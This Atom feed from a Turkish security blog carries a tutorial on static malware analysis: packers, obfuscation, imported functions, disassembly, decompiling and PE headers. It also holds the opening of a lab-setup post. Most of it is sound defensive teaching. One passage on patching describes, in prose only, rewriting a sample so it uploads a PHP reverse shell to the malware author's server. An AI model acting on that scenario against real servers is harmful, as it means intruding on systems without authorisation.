<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://192.168.254.251:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://192.168.254.251:4000/" rel="alternate" type="text/html" /><updated>2019-05-18T17:10:11+03:00</updated><id>http://192.168.254.251:4000/</id><title type="html">Daily Security</title><subtitle>In this blog we're going to solve CTF's &amp; Write Some Software's.My goal is redirect my little knowledge to other people.</subtitle><entry><title type="html">Malware Analysis - Static Analysis (Part 2)</title><link href="http://192.168.254.251:4000/2019/05/18/malware-analysis-part-2.html" rel="alternate" type="text/html" title="Malware Analysis - Static Analysis (Part 2)" /><published>2019-05-18T00:00:00+03:00</published><updated>2019-05-18T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/18/malware-analysis-part-2</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/18/malware-analysis-part-2.html">&lt;h4 id=&quot;malware-analysis---static-analysis-part-2&quot;&gt;Malware Analysis - Static Analysis (Part 2)&lt;/h4&gt;

&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin ikinci part’ına hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/0RPDnY.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu part içerisinde bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Statik&lt;/strong&gt; analizinin nasıl yapacağını anlatacağım.&lt;/p&gt;

&lt;p&gt;İleride ki part içerisinde &lt;strong&gt;Dinamik&lt;/strong&gt; analizini anlatacağım.&lt;/p&gt;

&lt;p&gt;Bu ikisini ayrı ayrı partlara bölmemin sebebi ikisininde tam olarak derinliklerine ineceğiz. Bu yüzden ikisini ayrı ayrı paylaşma gereği duydum.&lt;/p&gt;

&lt;p&gt;Önceki part içerisinden &lt;strong&gt;Win 7&lt;/strong&gt; ve &lt;strong&gt;REMnux&lt;/strong&gt;‘u kurduğunuzu aynı zamanda &lt;strong&gt;Network&lt;/strong&gt; ve &lt;strong&gt;Snapshot&lt;/strong&gt; ayarlarını gerçekleştirdiğinizi varsayıp devam ediyorum.&lt;/p&gt;

&lt;p&gt;Bu yazımızda &lt;strong&gt;Sanal Makine&lt;/strong&gt; kullanmayacağız. Çünkü &lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştırmadan inceleyeceğiz. Yalnız ileride &lt;strong&gt;Dynamic Analysis&lt;/strong&gt; yazımda artık bir kaç &lt;strong&gt;Malware&lt;/strong&gt; çalıştırmaya başladığımızda &lt;strong&gt;Sanal Makine&lt;/strong&gt; kullanacağımız için gerekli olacaktır.&lt;/p&gt;

&lt;p&gt;Şimdi yavaştan yazımıza geçelim ve bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Statik&lt;/strong&gt; analizinin nasıl yapacağını anlatalım.&lt;/p&gt;

&lt;h2 id=&quot;what-the-fk-is-packing-and-obfuscating-&quot;&gt;What The F!!K is packing and obfuscating ?&lt;/h2&gt;

&lt;p&gt;Bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Statik&lt;/strong&gt; analizini gerçekleştirmeye başlayacağımızda bakmamız gereken ilk noktalardan biri &lt;strong&gt;Pack&lt;/strong&gt; ve &lt;strong&gt;Obfuscate&lt;/strong&gt; terimleridir.&lt;/p&gt;

&lt;p&gt;Hemen bu terimlere daha önce denk gelmeyen arkadaşlar için basitçe anlatayım.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Packing Nedir ?&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Dosya sıkıştırma denilebilir basit bir şekilde.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Sıkıştırılan dosya kendi içinde aynı zamanda bu sıkıştırmayı çözmek için bir kod bulundurur.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Genellikle packlenmiş yani sıkıştırılmış dosyalar bu packing’i kendi içinde çözmek için anahtarlar kullanır.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Dahada basit bir şekilde &lt;strong&gt;Packing&lt;/strong&gt; bir &lt;strong&gt;Zararlı Yazılımın&lt;/strong&gt; asıl kodlarını &lt;strong&gt;Encode&lt;/strong&gt; eder yani &lt;strong&gt;Şifreler&lt;/strong&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bir &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ı &lt;strong&gt;Pack&lt;/strong&gt;‘lemenin asıl amacı &lt;strong&gt;Ana Kod&lt;/strong&gt;‘u &lt;strong&gt;Encode&lt;/strong&gt; etmek ve sonra bu &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt; çalıştığında &lt;strong&gt;Encode&lt;/strong&gt; edilmiş kodu &lt;strong&gt;Memory&lt;/strong&gt; yani &lt;strong&gt;Hafıza&lt;/strong&gt; içerisinde çözmektir.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin analizini engellemek için ve kafa karıştırmak için çokça kullanılan bir yöntemdir.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Bir &lt;strong&gt;Packing&lt;/strong&gt;‘in &lt;strong&gt;Routine&lt;/strong&gt;‘ini yani &lt;strong&gt;Rutin&lt;/strong&gt;‘ini gösteren googleden bulduğum görsel :
&lt;img src=&quot;https://i.hizliresim.com/k92BdJ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Obfuscating Nedir ?&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;İnsanların anlaması için zorlaştırma işlemi denilebilir basit bir şekilde.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bir kodu ne kadar daha az okuna bilir kılarsanız anlaşılmasıda zorlaşır buda bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin anlaşılmasını zorlaştıran bir yöntemdir.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Örneğin elimizdeki &lt;strong&gt;isim&lt;/strong&gt; değişkeni kod içerisinde &lt;strong&gt;vtkej12ns&lt;/strong&gt; şeklinde göründüğünde bu değişkenin &lt;strong&gt;isim&lt;/strong&gt; alanını tuttuğun anlamak zorlaşır ve buda &lt;strong&gt;Obfuscated&lt;/strong&gt; bir değişkendir.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Örnek bir &lt;strong&gt;Obfuscate&lt;/strong&gt; edilmiş kod :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/0RPn3R.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yukarıda bulunan resimdeki basit bir &lt;strong&gt;HTML&lt;/strong&gt; ve &lt;strong&gt;Javascript&lt;/strong&gt; kodunun ne kadar karmaşıklaştırıldığı anlaşılabilir durumda.&lt;/p&gt;

&lt;h2 id=&quot;how-to-unpack-and-deobfuscate&quot;&gt;How to unpack and deobfuscate&lt;/h2&gt;

&lt;p&gt;Öncelikle aşşağıdakileri anlamakta zorluk çekebilecek arkadaşlarımız için bazı terimlerin türkçe karşılığını yazayım :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Portable Executable&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Çalıştırılabilir dosyamızdır. Buna uzantısı &lt;strong&gt;.exe&lt;/strong&gt; vs.. olan dosyalarda denilebilir.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Packer&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Bir yazılımı &lt;strong&gt;Encode&lt;/strong&gt; etmeye yarayan yazılım.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Unpacker&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Encode&lt;/strong&gt; edilmiş bir yazılımı çözmeye yarayan yazılım&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;PE Sections&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Çalıştırılabilir dosyamızın içerdiği &lt;strong&gt;Code&lt;/strong&gt;, &lt;strong&gt;Data&lt;/strong&gt; gibi bilgileri tutan bölümlerdir.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;detecting-packing-and-unpacking-it&quot;&gt;Detecting packing and unpacking it&lt;/h1&gt;

&lt;h4 id=&quot;detecting-packing&quot;&gt;Detecting packing&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Pack&lt;/strong&gt; edilmiş bir &lt;strong&gt;Malware&lt;/strong&gt;‘yi &lt;strong&gt;Unpack&lt;/strong&gt; etmek yani çözmek ise bazen işin en kolay kısmı olabilirken en zor kısmıda olabilir.&lt;/p&gt;

&lt;p&gt;Öncelikle pack edilmiş bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin hangi pack yazılımını kullandığını bulmamız gerek.&lt;/p&gt;

&lt;p&gt;Fakat bunu gerçekleştirebilecek &lt;strong&gt;Yazılım&lt;/strong&gt;‘ları göstermeye geçmeden önce önemli bir not eklemek istiyorum. Hangi &lt;strong&gt;pack&lt;/strong&gt; bulma yazılımını kullanırsanız kullanın bu yazılımlar sadece bilinen &lt;strong&gt;Packer&lt;/strong&gt;‘ların isimlerini tutuyor.&lt;/p&gt;

&lt;p&gt;Dolayısı ile bulunamayan bir &lt;strong&gt;Packing&lt;/strong&gt; işlemini anlamak için &lt;strong&gt;Portable Executable&lt;/strong&gt; yani &lt;strong&gt;Çalıştırılabilir Dosya&lt;/strong&gt;‘mızın &lt;strong&gt;PE Section&lt;/strong&gt;‘larına bakmamız gereklidir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pack&lt;/strong&gt; edilmiş bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin hangi &lt;strong&gt;Pack&lt;/strong&gt; yazılımını kullandığını bulmak için bazı araçlar :&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;RDG Packer Detector&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PEiD&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Bu verdiğimiz toollardan eğer &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Packer&lt;/strong&gt; adını çıkarabilirseniz bu &lt;strong&gt;Packer&lt;/strong&gt;‘in bir &lt;strong&gt;Unpacker&lt;/strong&gt;‘ini bulmaya aramaya başlayabilirsiniz.&lt;/p&gt;

&lt;p&gt;Eğer &lt;strong&gt;Packer&lt;/strong&gt; adını verdiyse ve bu &lt;strong&gt;Packer&lt;/strong&gt; için herhangi bir &lt;strong&gt;Unpacker&lt;/strong&gt; bulunmuyorsa kendi ellerinizle işi bitirmeye kendinizi yavaştan hazırlamaya başlayın.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Packer&lt;/strong&gt;‘in adını bulamadıysanız şayet &lt;strong&gt;Portable Executable&lt;/strong&gt; içerisinde yani &lt;strong&gt;Malware&lt;/strong&gt;‘miz içerisinde bir &lt;strong&gt;Packing&lt;/strong&gt; işleminin gerçekleştiğini anlamak için &lt;strong&gt;PE Section&lt;/strong&gt;‘larına bakmanız yeterli olacaktır.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/7aOgOm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yukarıdaki fotorafta örnek bir &lt;strong&gt;Portable Executable&lt;/strong&gt;‘nin &lt;strong&gt;UPX Packer&lt;/strong&gt; ile &lt;strong&gt;Pack&lt;/strong&gt;‘lendiğini görebiliriz.&lt;/p&gt;

&lt;p&gt;Genellik ile normal bir &lt;strong&gt;PE&lt;/strong&gt;‘nin içerdiği &lt;strong&gt;Section&lt;/strong&gt;‘lar dışında &lt;strong&gt;Section&lt;/strong&gt;‘lar içeren &lt;strong&gt;PE&lt;/strong&gt;‘ler &lt;strong&gt;Packing&lt;/strong&gt; işlemine tabir tutulduğunu ortaya dökmemiz için bir yoldur.&lt;/p&gt;

&lt;p&gt;Ayrıca sadece &lt;strong&gt;Packing&lt;/strong&gt; işlemi değil aynı zamanda bu &lt;strong&gt;Section&lt;/strong&gt;‘lar içerisinden &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ın kendi içerisinden farklı bir yazılım çıkarttığı gibi değişik türde durumlara şahit olabilirsiniz.&lt;/p&gt;

&lt;h4 id=&quot;unpacking&quot;&gt;Unpacking&lt;/h4&gt;

&lt;p&gt;Dosyanın yani &lt;strong&gt;Malware&lt;/strong&gt;‘nin bir &lt;strong&gt;Packing&lt;/strong&gt; işlemi içerdiğini anladıktan sonra kendi elimizle &lt;strong&gt;Unpack&lt;/strong&gt; etmek için herhangi bir &lt;strong&gt;Debugger&lt;/strong&gt; aracılığı ile &lt;strong&gt;Malware&lt;/strong&gt;‘yi izleyip kendini &lt;strong&gt;Memory&lt;/strong&gt; İçerisinde &lt;strong&gt;Unpack&lt;/strong&gt; ettikten sonra &lt;strong&gt;Unpack&lt;/strong&gt; edilmiş &lt;strong&gt;Kodu&lt;/strong&gt; dışarıya bir &lt;strong&gt;.exe&lt;/strong&gt; olarak aktarabiliriz.&lt;/p&gt;

&lt;p&gt;Bir arkadaşımız &lt;strong&gt;Amber Packer&lt;/strong&gt; adında bir &lt;strong&gt;Packing&lt;/strong&gt; yazılımı geliştirdi. Yukarıda bahsettiğimiz toollardan neredeyse hepsi bunu bulamıyor.&lt;/p&gt;

&lt;p&gt;Ve bulamamasına rağmen yukarıda bahsettiğim tekniği kullanıp bu &lt;strong&gt;Packing&lt;/strong&gt; edilmiş dosyayı &lt;strong&gt;Unpack&lt;/strong&gt; edip bunu blog yazısına döken sevdiğim bir arkadaşımın blog yazısı :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://robindimyan.blogspot.com/2018/02/dkhos-rev300-cozumu.html&quot;&gt;Amber unpacking&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;detecting-obfuscating-and-deobfuscating-it&quot;&gt;Detecting obfuscating and deobfuscating it&lt;/h1&gt;
&lt;h4 id=&quot;detecting-obfuscating&quot;&gt;Detecting Obfuscating&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Detecting&lt;/strong&gt; kısmı çok basit.&lt;/p&gt;

&lt;p&gt;Anlaşılabilir bir &lt;strong&gt;Kod&lt;/strong&gt; ise şayet &lt;strong&gt;Obfuscated&lt;/strong&gt; bir &lt;strong&gt;Kod&lt;/strong&gt; değildir.&lt;/p&gt;

&lt;p&gt;Anlaşılmaz bir &lt;strong&gt;Kod&lt;/strong&gt; ise &lt;strong&gt;Obfuscated&lt;/strong&gt; bir &lt;strong&gt;Kod&lt;/strong&gt; olduğu söylenebilir.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/V9ZYvB.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;deobfuscating&quot;&gt;Deobfuscating&lt;/h4&gt;

&lt;p&gt;Bir &lt;strong&gt;Obfuscated&lt;/strong&gt; kodu &lt;strong&gt;Deobfuscate&lt;/strong&gt; etmek için &lt;strong&gt;Değişkenlerin&lt;/strong&gt;, &lt;strong&gt;Fonksiyonların&lt;/strong&gt; neler yaptığını takip edip sonra yaptığı şeye göre tekrar isimlendirebilirsiniz.&lt;/p&gt;

&lt;p&gt;Ya da internette bulunan &lt;strong&gt;Deobfuscation Tool&lt;/strong&gt;‘larından yararlanabilirsiniz.&lt;/p&gt;

&lt;p&gt;Buraya 13 tanesinin listelendiği bir forum post’unu bırakıyorum :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://rstforums.com/forum/topic/103595-13-deobfuscation-tools-for-reverse-engineers/&quot;&gt;13 Deobfuscator Tools&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Basit bir şekilde bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin yapılması gereken ilk iki &lt;strong&gt;Statik&lt;/strong&gt; analizinden bahsettim.&lt;/p&gt;

&lt;p&gt;Şimdi yavaştan &lt;strong&gt;Malware&lt;/strong&gt;‘mizin diğer &lt;strong&gt;Statik&lt;/strong&gt; analizlerini yapıp &lt;strong&gt;Zararlı yazılımımızı&lt;/strong&gt; dahada yakından tanıyalım.&lt;/p&gt;

&lt;h2 id=&quot;linked-libraries-and-functions&quot;&gt;Linked Libraries And Functions&lt;/h2&gt;

&lt;p&gt;Bir &lt;strong&gt;Malware&lt;/strong&gt;‘yi yani &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ı daha yakından tanımak için içerdiği &lt;strong&gt;Kütüphane&lt;/strong&gt; ve &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘lara bakmamız yeterli olacaktır.&lt;/p&gt;

&lt;p&gt;15 kilo dumbell’ı kanadıma çektikten sonra bu kısımı daha da derinden inceleyeceğiz.&lt;/p&gt;

&lt;p&gt;Ve çokta zorlu olmayan setlerden sonra geldim.&lt;/p&gt;

&lt;p&gt;Şimdi örnek bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Kütüphane&lt;/strong&gt; ve &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘larını listelemek için kendi yazdığım &lt;a href=&quot;https://github.com/blacknbunny/peanalyzer&quot;&gt;peanalyzer&lt;/a&gt; tool’unu kullanıp &lt;strong&gt;Malware&lt;/strong&gt;‘miz neler yapıyor inceleyelim.&lt;/p&gt;

&lt;p&gt;Tool’u indirdikten sonra :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python peanalyzer.py --file file.exe --show imports
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Demeniz yeterli olacaktır.&lt;/p&gt;

&lt;p&gt;Sonrasındaki çıktıda &lt;strong&gt;Kütüphaneler&lt;/strong&gt;  içerisinden &lt;strong&gt;Program&lt;/strong&gt; içerisinde hangi fonksiyonların kullanıldığını listelemiş olacağız.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/169dp1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin kullandığı fonksiyonlar değil yalnız bu &lt;strong&gt;Fonksiyonlar&lt;/strong&gt; arasından &lt;strong&gt;ShellExecuteW&lt;/strong&gt;, &lt;strong&gt;GetCurrentProcess&lt;/strong&gt; gibi &lt;strong&gt;Fonksiyonlar&lt;/strong&gt; genellik ile &lt;strong&gt;Malware&lt;/strong&gt;‘ler tarafından kullanılıyor.&lt;/p&gt;

&lt;p&gt;Burada objektif bir şekilde anlatıyorum size bunu. Artık siz kendi inceleyeceğiniz &lt;strong&gt;Malware&lt;/strong&gt;‘yi daha yakından tanımak için neler yapmanız gerektiğini daha iyi anlayacaksınız.&lt;/p&gt;

&lt;p&gt;Yani bir &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ın herhangi bir &lt;strong&gt;Internet Sayfasından&lt;/strong&gt; dosya indirdiğini &lt;strong&gt;Fonksiyonlar&lt;/strong&gt; aracılığıyla görmek mümkün.&lt;/p&gt;

&lt;p&gt;Ve bu sayede kafanızda &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ın neler yaptığına dair kafamızda bir şema olacaktır.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Kütüphaneler&lt;/strong&gt;‘in ve &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘ların &lt;strong&gt;Statik&lt;/strong&gt; bir analiz içerisinde ne gibi büyük bir rol oynadığını bu şekilde anlayabilirsiniz.&lt;/p&gt;

&lt;h2 id=&quot;disassemble-decompiling-patching&quot;&gt;Disassemble, Decompiling, Patching&lt;/h2&gt;

&lt;h4 id=&quot;disassemble&quot;&gt;Disassemble&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Statik&lt;/strong&gt; bir analiz içerisinde ayrıca &lt;strong&gt;Malware&lt;/strong&gt;‘nin nasıl bir gidişat izlediğini görmek ve düzenlemek bize ayrıca büyük bir avantaj sağlar.&lt;/p&gt;

&lt;p&gt;Yukarıda da kullandığımız &lt;a href=&quot;https://github.com/blacknbunny/peanalyzer&quot;&gt;peanalyzer&lt;/a&gt; tool’u yazılımları &lt;strong&gt;Disassemble&lt;/strong&gt; etmemize yarıyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python peanalyzer.py --file file.exe --disassemble all
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/jgEnDn.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;File.exe&lt;/strong&gt;‘yi bir malware olarak düşünürsek şayet &lt;strong&gt;Assembly&lt;/strong&gt; dilinde neler yaptığını incelememiz çok yararlı olacaktır.&lt;/p&gt;

&lt;h4 id=&quot;decompiling&quot;&gt;Decompiling&lt;/h4&gt;

&lt;p&gt;Şayet bazı &lt;strong&gt;Malware&lt;/strong&gt;‘leri &lt;strong&gt;Assembly&lt;/strong&gt; değilde kendi dilinden okumak mümkün olabiliyor.&lt;/p&gt;

&lt;p&gt;Örneğin bir &lt;strong&gt;C#&lt;/strong&gt; ile yazılan &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘u verilmesede bazı araçlar ile o &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘u almak mümkün.&lt;/p&gt;

&lt;p&gt;Yani kısaca &lt;strong&gt;Compile&lt;/strong&gt; edilip &lt;strong&gt;Assembly&lt;/strong&gt;‘e çevirilen bir kodu tekrar eski haline çevirmek &lt;strong&gt;Decompiling&lt;/strong&gt; oluyor.&lt;/p&gt;

&lt;p&gt;Dahada kısaca aşşağıdaki fotorafı tersine çevirdiğinizde olan şey basit bir şekilde &lt;strong&gt;Decompiling&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/zjW4ZY.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;patching&quot;&gt;Patching&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Hex Code&lt;/strong&gt;‘ları yani &lt;strong&gt;Shellcode&lt;/strong&gt;‘ları ile oynama zamanı geldi demek bu.&lt;/p&gt;

&lt;p&gt;Diyelim ki &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ı geliştiren kişi &lt;strong&gt;UploadFileToServer&lt;/strong&gt; adında bir fonksiyon geliştirdi &lt;strong&gt;Program&lt;/strong&gt; içerisinde.&lt;/p&gt;

&lt;p&gt;Ve sizin bazı özel dosyalarınızı kendi &lt;strong&gt;Sunucu&lt;/strong&gt;‘suna yüklüyor. Ve bu şekilde &lt;strong&gt;Sunucu&lt;/strong&gt;‘dan direk bu dosyalara ulaşabiliyor.&lt;/p&gt;

&lt;p&gt;Diyelim ki bu &lt;strong&gt;Fonksiyon&lt;/strong&gt; 1 adet string alıyor parametre olarak. Ve bu parametrede yükleyeceği dosya olsun.&lt;/p&gt;

&lt;p&gt;Ve bu parametreyide &lt;strong&gt;Zararlı Yazılım Geliştiricisi&lt;/strong&gt; özel olarak &lt;strong&gt;secret.txt&lt;/strong&gt; olarak atadı.&lt;/p&gt;

&lt;p&gt;Şayet biz bunu program içerisinde &lt;strong&gt;Hex Code&lt;/strong&gt;‘ları arasında değiştirip &lt;strong&gt;reverseshell.php&lt;/strong&gt; adında kendi yazdığımız küçük bir &lt;strong&gt;Reverse Shell&lt;/strong&gt; kodları içeren &lt;strong&gt;PHP&lt;/strong&gt; dosyası ile değiştirdik.&lt;/p&gt;

&lt;p&gt;Ve bilgisayarımızdan &lt;strong&gt;PORT&lt;/strong&gt;‘u dinlemeye başladık.&lt;/p&gt;

&lt;p&gt;Bu dosya &lt;strong&gt;Remote Server&lt;/strong&gt;‘e yükleneceğinden. &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt; geliştiricisinin sunucusuna basit bir şekilde ulaşabileceğiz.&lt;/p&gt;

&lt;p&gt;Ve basit bir şekilde &lt;strong&gt;Patching&lt;/strong&gt; bu.&lt;/p&gt;

&lt;h2 id=&quot;pe-i̇çerisinden-alabileceğimiz-bilgiler&quot;&gt;PE İçerisinden Alabileceğimiz Bilgiler&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;TimeDateStamp&lt;/strong&gt; : Yazılan &lt;strong&gt;Program&lt;/strong&gt;‘ın yani &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ın ne tarihte ve ne zamanda &lt;strong&gt;Compile&lt;/strong&gt; edildiği bilgisini tutar.&lt;/p&gt;

&lt;p&gt;Bu bilgi değiştirilebilirdir &lt;strong&gt;Expert Malware Developer&lt;/strong&gt; arkadaşlarımız genellikle bunun yerine sahte bir bilgi koymayı tercih eder malum çok büyük bir yazılım ise şayet devlet baba uyumuyor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/grNoE0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bunun dışında &lt;strong&gt;Yazılım&lt;/strong&gt;‘ın hangi dil ile geliştirdiği,&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Compiler&lt;/strong&gt; olarak ne kullanıldığı dair tüm bilgileri içerir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt;‘un &lt;strong&gt;PE&lt;/strong&gt; dökümantasyonu :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format&quot;&gt;PE Format&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;statik-analiz-için-işimizi-kolaylaştıracak-kaynaklar-ve-birkaç-tool&quot;&gt;Statik analiz için işimizi kolaylaştıracak kaynaklar ve birkaç tool&lt;/h2&gt;

&lt;h4 id=&quot;genellikle-kullandığım-araçlar-&quot;&gt;Genellikle kullandığım araçlar :&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;RegShot&lt;/strong&gt; : &lt;strong&gt;Malware&lt;/strong&gt; çalışmadan önce &lt;strong&gt;Registry&lt;/strong&gt;‘i kaydedip çalıştıktan sonraki ile karşılaştırmamıza yarıyor. Basitce &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Registry&lt;/strong&gt; içerisinde neleri değiştirdiğini inceleyebiliriz.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;PE-Bear&lt;/strong&gt; : Zamanında &lt;strong&gt;CIA&lt;/strong&gt;‘inde kullandığı bir &lt;strong&gt;PE View&lt;/strong&gt; aracı.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;güzel-kaynaklar-&quot;&gt;Güzel kaynaklar :&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;http://malwareanalysis.tools/&quot;&gt;malwareanalysis.tools&lt;/a&gt; : Web sayfası içerisinden analizini yaptığınız malware için ne gerekiyorsa basit bir şekilde ulaşabilmenizi sağlayan yararlı bir sayfa.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/rshipp/awesome-malware-analysis&quot;&gt;awesome-malware-analysis&lt;/a&gt; : Güzel bir &lt;strong&gt;Cheat Sheet&lt;/strong&gt; malware analizi için.&lt;/p&gt;

&lt;h2 id=&quot;the-end&quot;&gt;THE END&lt;/h2&gt;

&lt;p&gt;Umarım yazıyı okurken keyif almışsınızdır.&lt;/p&gt;

&lt;p&gt;Sorular için twitter : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis - Static Analysis (Part 2)</summary></entry><entry><title type="html">Malware Analysis - Lab Setup (Part 1)</title><link href="http://192.168.254.251:4000/2019/05/16/malware-analysis-part-1.html" rel="alternate" type="text/html" title="Malware Analysis - Lab Setup (Part 1)" /><published>2019-05-16T00:00:00+03:00</published><updated>2019-05-16T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/16/malware-analysis-part-1</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/16/malware-analysis-part-1.html">&lt;h1 id=&quot;malware-analysis-part-1&quot;&gt;Malware Analysis (Part 1)&lt;/h1&gt;

&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin ilk part’ına hoşgeldiniz.&lt;/p&gt;

